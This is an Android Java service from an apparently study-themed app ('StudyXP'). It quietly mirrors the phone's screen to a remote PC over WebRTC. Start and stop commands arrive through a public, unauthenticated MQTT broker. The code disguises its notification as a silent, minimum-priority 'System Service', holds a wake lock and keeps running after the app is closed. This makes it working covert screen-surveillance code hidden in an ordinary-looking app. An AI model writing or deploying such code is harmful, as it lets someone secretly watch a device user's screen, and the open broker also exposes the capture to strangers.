package com.estiuk.studyxp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.MqttCallbackExtended;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
import org.json.JSONObject;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.MediaStreamTrack;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpCapabilities;
import org.webrtc.RtpTransceiver;
import org.webrtc.ScreenCapturerAndroid;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class ScreenMirrorService extends Service {

    private static final String TAG = "StudyXP-Mirror";

    public static final String ACTION_INIT     = "com.estiuk.studyxp.mirror.INIT";
    public static final String ACTION_STOP_SVC = "com.estiuk.studyxp.mirror.STOP_SVC";
    public static final String ACTION_PING     = "com.estiuk.studyxp.mirror.PING";

    private static final String CHANNEL_ID      = "studyxp_mirror_sys_channel";
    private static final int    NOTIFICATION_ID = 9911;

    private static final String ROOM_ID     = "studyxp-amar-gopon-room-2025";
    private static final String MQTT_BROKER = "tcp://broker.hivemq.com:1883";

    private static final String TOPIC_CMD       = "studyxp/" + ROOM_ID + "/cmd";
    private static final String TOPIC_STATUS    = "studyxp/" + ROOM_ID + "/status";
    private static final String TOPIC_OFFER     = "studyxp/" + ROOM_ID + "/offer";
    private static final String TOPIC_ANSWER    = "studyxp/" + ROOM_ID + "/answer";
    private static final String TOPIC_ICE_PC    = "studyxp/" + ROOM_ID + "/ice-pc";
    private static final String TOPIC_ICE_PHONE = "studyxp/" + ROOM_ID + "/ice-phone";

    private EglBase               eglBase;
    private PeerConnectionFactory factory;
    private SurfaceTextureHelper  surfaceTextureHelper;
    private VideoSource           videoSource;
    private VideoTrack            videoTrack;
    private ScreenCapturerAndroid screenCapturer;
    private MqttClient            mqttClient;

    private PeerConnection peerConnection;
    private boolean        sessionActive = false;
    private boolean        initialized    = false;

    private PowerManager.WakeLock wakeLock;

    @Override public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        acquireWakeLock();
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                        PowerManager.PARTIAL_WAKE_LOCK,
                        "StudyXP::MirrorWakeLock");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
                Log.d(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock failed", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            if (initialized) return START_STICKY;
            return START_NOT_STICKY;
        }

        String action = intent.getAction();

        if (ACTION_STOP_SVC.equals(action)) {
            fullShutdown();
            return START_NOT_STICKY;
        }

        if (ACTION_PING.equals(action)) {
            return START_STICKY;
        }

        if (!initialized && ACTION_INIT.equals(action)) {
            int resultCode = intent.getIntExtra("resultCode", 0);
            Intent resultData = intent.getParcelableExtra("resultData");
            startAsForeground();

            new Thread(() -> {
                boolean ok = initOnce(resultCode, resultData);
                if (ok) {
                    initialized = true;
                    connectMqtt();
                    publishStatus("ready");
                } else {
                    publishStatus("init-failed");
                    stopSelf();
                }
            }, "MirrorInit").start();
        }
        return START_STICKY;
    }

    @Override public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved — service will keep running");
        super.onTaskRemoved(rootIntent);
    }

    @Override public void onDestroy() {
        Log.d(TAG, "onDestroy called");
        fullShutdown();
        super.onDestroy();
    }

    @Nullable @Override public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void startAsForeground() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, n,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, n);
        }
    }

    private boolean initOnce(int resultCode, Intent resultData) {
        try {
            PeerConnectionFactory.InitializationOptions init =
                    PeerConnectionFactory.InitializationOptions.builder(this)
                            .createInitializationOptions();
            PeerConnectionFactory.initialize(init);

            eglBase = EglBase.create();
            factory = PeerConnectionFactory.builder()
                    .setOptions(new PeerConnectionFactory.Options())
                    .createPeerConnectionFactory();

            surfaceTextureHelper = SurfaceTextureHelper.create(
                    "CaptureThread", eglBase.getEglBaseContext());
            videoSource = factory.createVideoSource(false);

            screenCapturer = new ScreenCapturerAndroid(resultData,
                    new MediaProjection.Callback() {
                        @Override public void onStop() {
                            Log.d(TAG, "MediaProjection stopped by user");
                            publishStatus("permission-revoked");
                            fullShutdown();
                        }
                    });

            screenCapturer.initialize(surfaceTextureHelper, this,
                    videoSource.getCapturerObserver());

            videoTrack = factory.createVideoTrack("screen", videoSource);
            videoTrack.setEnabled(false);

            Log.d(TAG, "initOnce OK");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "initOnce failed", e);
            return false;
        }
    }

    private void connectMqtt() {
        try {
            String clientId = "studyxp-phone-" + System.currentTimeMillis();
            mqttClient = new MqttClient(MQTT_BROKER, clientId, new MemoryPersistence());

            MqttConnectOptions opts = new MqttConnectOptions();
            opts.setAutomaticReconnect(true);
            opts.setCleanSession(true);
            opts.setConnectionTimeout(30);
            opts.setKeepAliveInterval(30);
            opts.setMaxInflight(20);

            mqttClient.setCallback(new MqttCallbackExtended() {
                @Override public void connectComplete(boolean reconnect, String serverURI) {
                    Log.d(TAG, "MQTT connected (reconnect=" + reconnect + ")");
                    try {
                        mqttClient.subscribe(TOPIC_CMD, 1);
                        mqttClient.subscribe(TOPIC_ANSWER, 1);
                        mqttClient.subscribe(TOPIC_ICE_PC, 1);
                        publishStatus(sessionActive ? "capturing" : "ready");
                    } catch (Exception e) { Log.e(TAG, "subscribe failed", e); }
                }
                @Override public void connectionLost(Throwable cause) {
                    Log.d(TAG, "MQTT lost: " + cause);
                }
                @Override public void messageArrived(String topic, MqttMessage message) {
                    String payload = new String(message.getPayload()).trim();
                    Log.d(TAG, "MSG [" + topic + "] = " + payload);
                    try {
                        if (TOPIC_CMD.equals(topic))           handleCommand(payload);
                        else if (TOPIC_ANSWER.equals(topic))   onAnswerReceived(new JSONObject(payload));
                        else if (TOPIC_ICE_PC.equals(topic))   onRemoteIce(new JSONObject(payload));
                    } catch (Exception e) { Log.e(TAG, "msg handle failed", e); }
                }
                @Override public void deliveryComplete(IMqttDeliveryToken token) {}
            });

            mqttClient.connect(opts);
        } catch (Exception e) { Log.e(TAG, "MQTT connect failed", e); }
    }

    private void publishStatus(String s) {
        try {
            if (mqttClient != null && mqttClient.isConnected()) {
                mqttClient.publish(TOPIC_STATUS, new MqttMessage(s.getBytes()));
                Log.d(TAG, "Status → " + s);
            }
        } catch (Exception ignored) {}
    }

    private void handleCommand(String cmd) {
        cmd = cmd.toLowerCase();
        Log.d(TAG, "handleCommand: " + cmd + " (sessionActive=" + sessionActive + ")");
        if (cmd.equals("start") && !sessionActive) {
            startSession();
        } else if (cmd.equals("stop") && sessionActive) {
            stopSession();
        } else if (cmd.equals("status")) {
            publishStatus(sessionActive ? "capturing" : "ready");
        }
    }

    private void startSession() {
        try {
            List<PeerConnection.IceServer> ice = new ArrayList<>();
            ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
            ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());

            PeerConnection.RTCConfiguration cfg = new PeerConnection.RTCConfiguration(ice);
            cfg.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
            cfg.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;

            peerConnection = factory.createPeerConnection(cfg, new PeerConnection.Observer() {
                @Override public void onIceCandidate(IceCandidate candidate) { sendLocalIce(candidate); }
                @Override public void onIceCandidatesRemoved(IceCandidate[] candidates) {}
                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState state) {
                    Log.d(TAG, "ICE state: " + state);
                    if (state == PeerConnection.IceConnectionState.CONNECTED) {
                        publishStatus("capturing");
                    } else if (state == PeerConnection.IceConnectionState.DISCONNECTED
                            || state == PeerConnection.IceConnectionState.FAILED
                            || state == PeerConnection.IceConnectionState.CLOSED) {
                        publishStatus("peer-down");
                    }
                }
                @Override public void onSignalingChange(PeerConnection.SignalingState s) {}
                @Override public void onIceConnectionReceivingChange(boolean b) {}
                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
                @Override public void onAddStream(MediaStream s) {}
                @Override public void onRemoveStream(MediaStream s) {}
                @Override public void onDataChannel(org.webrtc.DataChannel c) {}
                @Override public void onRenegotiationNeeded() {}
                @Override public void onAddTrack(org.webrtc.RtpReceiver r, MediaStream[] streams) {}
            });

            peerConnection.addTrack(videoTrack, Collections.singletonList("stream"));

            // Force VP8 for compatibility with aiortc 1.9.0. It supports VP8
            // and only selected H.264 profiles, so relying on a device-default
            // H.264 profile can produce "Failed to set remote video description send parameters".
            RtpCapabilities videoCapabilities = factory.getRtpSenderCapabilities(
                    MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO);
            Integer vp8PayloadType = null;
            for (RtpCapabilities.CodecCapability codec : videoCapabilities.codecs) {
                if ("VP8".equalsIgnoreCase(codec.name)) {
                    vp8PayloadType = codec.preferredPayloadType;
                    break;
                }
            }
            if (vp8PayloadType == null) {
                throw new IllegalStateException("Android WebRTC build has no VP8 video codec");
            }

            // Include only VP8 plus its matching RTX codec, if available.
            List<RtpCapabilities.CodecCapability> vp8Codecs = new ArrayList<>();
            for (RtpCapabilities.CodecCapability codec : videoCapabilities.codecs) {
                if ("VP8".equalsIgnoreCase(codec.name)) {
                    vp8Codecs.add(codec);
                } else if ("rtx".equalsIgnoreCase(codec.name)
                        && codec.parameters != null
                        && String.valueOf(vp8PayloadType).equals(codec.parameters.get("apt"))) {
                    vp8Codecs.add(codec);
                }
            }

            boolean codecPreferenceApplied = false;
            for (RtpTransceiver transceiver : peerConnection.getTransceivers()) {
                if (transceiver.getMediaType() == MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO) {
                    transceiver.setCodecPreferences(vp8Codecs);
                    codecPreferenceApplied = true;
                    break;
                }
            }
            if (!codecPreferenceApplied) {
                throw new IllegalStateException("Could not find video transceiver for VP8 preference");
            }
            Log.d(TAG, "VP8 codec preference set for PC aiortc receiver");

            videoTrack.setEnabled(true);
            screenCapturer.startCapture(720, 1280, 30);

            MediaConstraints constraints = new MediaConstraints();
            peerConnection.createOffer(new SdpObserver() {
                @Override public void onCreateSuccess(SessionDescription sdp) {
                    peerConnection.setLocalDescription(new SdpObserver() {
                        @Override public void onCreateSuccess(SessionDescription s) {}
                        @Override public void onSetSuccess()            { sendOffer(sdp); }
                        @Override public void onCreateFailure(String s) {}
                        @Override public void onSetFailure(String s)    {
                            Log.e(TAG, "setLocalDescription failed: " + s);
                        }
                    }, sdp);
                }
                @Override public void onSetSuccess() {}
                @Override public void onCreateFailure(String s) {
                    Log.e(TAG, "createOffer failed: " + s);
                }
                @Override public void onSetFailure(String s) {}
            }, constraints);

            sessionActive = true;
            publishStatus("starting");
            Log.d(TAG, "Session started");

        } catch (Exception e) {
            Log.e(TAG, "startSession failed", e);
            publishStatus("start-failed");
            stopSession();
        }
    }

    private void stopSession() {
        sessionActive = false;
        try {
            try { screenCapturer.stopCapture(); } catch (Exception ignored) {}
            if (videoTrack != null) videoTrack.setEnabled(false);
            if (peerConnection != null) {
                peerConnection.close();
                peerConnection = null;
            }
        } catch (Exception e) { Log.e(TAG, "stopSession err", e); }
        publishStatus("ready");
        Log.d(TAG, "Session stopped");
    }

    private void sendOffer(SessionDescription sdp) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("sdp", sdp.description);
            obj.put("type", sdp.type.canonicalForm());
            mqttClient.publish(TOPIC_OFFER, new MqttMessage(obj.toString().getBytes()));
            Log.d(TAG, "Offer sent");
        } catch (Exception e) { Log.e(TAG, "sendOffer failed", e); }
    }

    private void onAnswerReceived(JSONObject obj) {
        try {
            SessionDescription answer = new SessionDescription(
                    SessionDescription.Type.fromCanonicalForm(obj.getString("type")),
                    obj.getString("sdp"));
            peerConnection.setRemoteDescription(new SdpObserver() {
                @Override public void onCreateSuccess(SessionDescription s) {}
                @Override public void onSetSuccess()            { Log.d(TAG, "Remote answer set"); }
                @Override public void onCreateFailure(String s) {}
                @Override public void onSetFailure(String s)    {
                    Log.e(TAG, "setRemoteDescription failed: " + s);
                }
            }, answer);
        } catch (Exception e) { Log.e(TAG, "onAnswer failed", e); }
    }

    private void sendLocalIce(IceCandidate c) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("candidate", c.sdp);
            obj.put("sdpMid", c.sdpMid);
            obj.put("sdpMLineIndex", c.sdpMLineIndex);
            mqttClient.publish(TOPIC_ICE_PHONE, new MqttMessage(obj.toString().getBytes()));
        } catch (Exception e) { Log.e(TAG, "send ICE failed", e); }
    }

    private void onRemoteIce(JSONObject obj) {
        try {
            IceCandidate c = new IceCandidate(
                    obj.getString("sdpMid"),
                    obj.getInt("sdpMLineIndex"),
                    obj.getString("candidate"));
            if (peerConnection != null) peerConnection.addIceCandidate(c);
        } catch (Exception e) { Log.e(TAG, "addIceCandidate failed", e); }
    }

    private void fullShutdown() {
        sessionActive = false;
        try {
            if (screenCapturer != null) {
                try { screenCapturer.stopCapture(); } catch (Exception ignored) {}
                screenCapturer.dispose();
                screenCapturer = null;
            }
            if (videoSource        != null) { videoSource.dispose();        videoSource = null; }
            if (videoTrack         != null) { videoTrack.dispose();         videoTrack = null; }
            if (surfaceTextureHelper != null) { surfaceTextureHelper.dispose();
                                                surfaceTextureHelper = null; }
            if (peerConnection     != null) { peerConnection.close();       peerConnection = null; }
            if (factory            != null) { factory.dispose();            factory = null; }
            if (eglBase            != null) { eglBase.release();            eglBase = null; }
            if (mqttClient != null && mqttClient.isConnected()) {
                try { mqttClient.disconnect(); } catch (Exception ignored) {}
                mqttClient = null;
            }
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception e) { Log.e(TAG, "cleanup error", e); }
        initialized = false;
        try { stopForeground(true); } catch (Exception ignored) {}
        stopSelf();
    }
}
